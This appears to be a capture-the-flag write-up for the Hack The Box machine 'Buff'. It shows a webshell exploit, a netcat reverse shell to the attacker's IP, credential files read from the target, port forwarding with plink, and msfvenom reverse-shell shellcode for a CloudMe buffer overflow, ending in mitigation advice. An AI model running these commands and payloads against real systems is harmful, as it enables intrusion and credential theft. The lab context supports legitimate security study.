# Buff

```
root@kali:/home/kali/htb/Buff# nmap -p- -sV -sC 10.129.25.107 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-22 03:01 EDT
Nmap scan report for 10.129.25.107
Host is up (0.036s latency).
Not shown: 65534 filtered ports
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
|_http-title: mrb3n's Bro Hut

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 265.75 seconds
```

going to the about page says the server is running on Gym Management System 1.0

Googling this leads to Unauthenticated RCE. https://www.exploit-db.com/exploits/48506

```
root@kali:/home/kali/htb/Buff# python exploit.py http://10.129.25.107:8080/
            /\
/vvvvvvvvvvvv \--------------------------------------,                                                               
`^^^^^^^^^^^^ /============BOKU====================="
            \/

[+] Successfully connected to webshell.
C:\xampp\htdocs\gym\upload> whoami
�PNG
▒
buff\shaun

C:\xampp\htdocs\gym\upload> whoami /priv 
�PNG
▒

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State   
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled 
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled

C:\xampp\htdocs\gym\upload> 

```

The shell wont let me pry around easily so I upload nc.exe and get a better shell:

```
C:\xampp\htdocs\gym\upload> curl "http://10.10.14.51/nc.exe" --output nc.exe
�PNG
▒

C:\xampp\htdocs\gym\upload> nc.exe 10.10.14.51 1337 -e cmd.exe

```

Listener:

```
root@kali:/home/kali/htb/Buff# nc -nlvp 1337
Listening on 0.0.0.0 1337
Connection received on 10.129.25.107 49796
Microsoft Windows [Version 10.0.17134.1610]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\gym\upload>cd ..
cd ..

C:\xampp\htdocs\gym>
```

I find interesting stuff immediately:

```
C:\xampp>type passwords.txt
type passwords.txt
### XAMPP Default Passwords ###

1) MySQL (phpMyAdmin):

   User: root
   Password:
   (means no password!)

2) FileZilla FTP:

   [ You have to create a new user on the FileZilla Interface ] 

3) Mercury (not in the USB & lite version): 

   Postmaster: Postmaster (postmaster@localhost)
   Administrator: Admin (admin@localhost)

   User: newuser  
   Password: wampp 

4) WEBDAV: 

   User: xampp-dav-unsecure
   Password: ppmax2011
   Attention: WEBDAV is not active since XAMPP Version 1.7.4.
   For activation please comment out the httpd-dav.conf and
   following modules in the httpd.conf
   
   LoadModule dav_module modules/mod_dav.so
   LoadModule dav_fs_module modules/mod_dav_fs.so  
   
   Please do not forget to refresh the WEBDAV authentification (users and passwords).     




I also find:

PS C:\xampp\htdocs\gym> type "New Text Document.txt"
type "New Text Document.txt"
$mysql_host = "mysql16.000webhost.com";
$mysql_database = "a8743500_secure";
$mysql_user = "a8743500_secure";
$mysql_password = "ipad12345";
PS C:\xampp\htdocs\gym> 

```

There are tons of service .bat files, but none seem to work.

I upload winpeas, but it doesn't really give me anything. net start is not allowed, netstat shows some potentially interesting stuff.

I browse through the program files, but I don't find much. Eventually I reach shaun's folder. And in his downloads folder is an executable:

```
C:\Users\shaun\Downloads>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A22D-49F7

 Directory of C:\Users\shaun\Downloads

14/07/2020  12:27    <DIR>          .
14/07/2020  12:27    <DIR>          ..
16/06/2020  15:26        17,830,824 CloudMe_1112.exe
               1 File(s)     17,830,824 bytes
               2 Dir(s)   8,998,813,696 bytes free

C:\Users\shaun\Downloads>
```

I google CloudMe_1112.exe and the first thing I see is a buffer overflow exploit. https://www.exploit-db.com/exploits/48389


I run the exe file and check that the service is running:

```
C:\Users\shaun\Downloads>netstat -ano | findstr 8888
netstat -ano | findstr 8888
  TCP    127.0.0.1:8888         0.0.0.0:0              LISTENING       5164

C:\Users\shaun\Downloads>
```

the service seems a bit unstable. Sometimes it shows up, and sometimes it does not.

I decide to port-forward with pslink.exe here

```
C:\xampp\htdocs\gym\upload>plink.exe -l root -pw kali -R 8888:127.0.0.1:8888 -P 4222 10.10.14.51
plink.exe -l root -pw kali -R 8888:127.0.0.1:8888 -P 4222 10.10.14.51
The server's host key is not cached in the registry. You
have no guarantee that the server is the computer you
think it is.
The server's rsa2 key fingerprint is:
ssh-rsa 3072 61:87:0f:1b:6c:bc:7e:c3:25:2c:03:c2:5e:f1:2f:22
If you trust this host, enter "y" to add the key to
PuTTY's cache and carry on connecting.
If you want to carry on connecting just once, without
adding the key to the cache, enter "n".
If you do not trust this host, press Return to abandon the
connection.
Store key in cache? (y/n) y
root@kali:~#  
```

Some more detail about this can be found in my [Granpa Writeup](https://github.com/matale14/Writeups/blob/main/HTB/Granpa/Granpa.MD)

The default payload for the exploit is `msfvenom -a x86 -p windows/exec CMD=calc.exe -b '\x00\x0A\x0D' -f python`

So we simply change the payload to a reverse shell here:

```
root@kali:/home/kali/htb/Buff# msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=10.10.14.51 LPORT=1338 -b '\x00\x0A\x0D' -f py
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of py file: 1712 bytes
buf =  b""
buf += b"\xbd\xb7\xc3\x27\x99\xdd\xc0\xd9\x74\x24\xf4\x5b\x31"
buf += b"\xc9\xb1\x52\x83\xeb\xfc\x31\x6b\x0e\x03\xdc\xcd\xc5"
buf += b"\x6c\xde\x3a\x8b\x8f\x1e\xbb\xec\x06\xfb\x8a\x2c\x7c"
buf += b"\x88\xbd\x9c\xf6\xdc\x31\x56\x5a\xf4\xc2\x1a\x73\xfb"
buf += b"\x63\x90\xa5\x32\x73\x89\x96\x55\xf7\xd0\xca\xb5\xc6"
buf += b"\x1a\x1f\xb4\x0f\x46\xd2\xe4\xd8\x0c\x41\x18\x6c\x58"
buf += b"\x5a\x93\x3e\x4c\xda\x40\xf6\x6f\xcb\xd7\x8c\x29\xcb"
buf += b"\xd6\x41\x42\x42\xc0\x86\x6f\x1c\x7b\x7c\x1b\x9f\xad"
buf += b"\x4c\xe4\x0c\x90\x60\x17\x4c\xd5\x47\xc8\x3b\x2f\xb4"
buf += b"\x75\x3c\xf4\xc6\xa1\xc9\xee\x61\x21\x69\xca\x90\xe6"
buf += b"\xec\x99\x9f\x43\x7a\xc5\x83\x52\xaf\x7e\xbf\xdf\x4e"
buf += b"\x50\x49\x9b\x74\x74\x11\x7f\x14\x2d\xff\x2e\x29\x2d"
buf += b"\xa0\x8f\x8f\x26\x4d\xdb\xbd\x65\x1a\x28\x8c\x95\xda"
buf += b"\x26\x87\xe6\xe8\xe9\x33\x60\x41\x61\x9a\x77\xa6\x58"
buf += b"\x5a\xe7\x59\x63\x9b\x2e\x9e\x37\xcb\x58\x37\x38\x80"
buf += b"\x98\xb8\xed\x07\xc8\x16\x5e\xe8\xb8\xd6\x0e\x80\xd2"
buf += b"\xd8\x71\xb0\xdd\x32\x1a\x5b\x24\xd5\x2f\x96\x28\x16"
buf += b"\x58\xa4\x34\x5d\xa2\x21\xd2\x37\xc2\x67\x4d\xa0\x7b"
buf += b"\x22\x05\x51\x83\xf8\x60\x51\x0f\x0f\x95\x1c\xf8\x7a"
buf += b"\x85\xc9\x08\x31\xf7\x5c\x16\xef\x9f\x03\x85\x74\x5f"
buf += b"\x4d\xb6\x22\x08\x1a\x08\x3b\xdc\xb6\x33\x95\xc2\x4a"
buf += b"\xa5\xde\x46\x91\x16\xe0\x47\x54\x22\xc6\x57\xa0\xab"
buf += b"\x42\x03\x7c\xfa\x1c\xfd\x3a\x54\xef\x57\x95\x0b\xb9"
buf += b"\x3f\x60\x60\x7a\x39\x6d\xad\x0c\xa5\xdc\x18\x49\xda"
buf += b"\xd1\xcc\x5d\xa3\x0f\x6d\xa1\x7e\x94\x9d\xe8\x22\xbd"
buf += b"\x35\xb5\xb7\xff\x5b\x46\x62\xc3\x65\xc5\x86\xbc\x91"
buf += b"\xd5\xe3\xb9\xde\x51\x18\xb0\x4f\x34\x1e\x67\x6f\x1d"
root@kali:/home/kali/htb/Buff# 
```

And change the payload in the exploit.

when we execute the exploit. Our port forward will send the commands from the exploit straight to the machine we are connected to.

This machine then executes the payload and sends us the reverse shell:

```
root@kali:/home/kali/htb/Buff# nc -nlvp 1338
Listening on 0.0.0.0 1338
Connection received on 10.129.25.107 49812
Microsoft Windows [Version 10.0.17134.1610]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
buff\administrator

C:\Windows\system32>

```


## Comparing myself to the official writeup:

They find the Gym management software exploit and get a shell.

They improve the shell with netcat, and then find the CloudMe file in the shaun Downloads folder.

They download the exe and run it on a VM.

They then discover the buffer overflow exploit, and use chisel to port forward and then use msfvenom to generate the payload.

Running the exploit gives the reverse admin shell.


## How to stop this exploit:

Gym management software should be updated to the most recent version to patch the exploit.

The same can be said for CloudMe. There was also a lot of creds lying around, so the system admin should fix that.

Better AV and system security should be implemented. The accounts should not be able to run downloaded files.

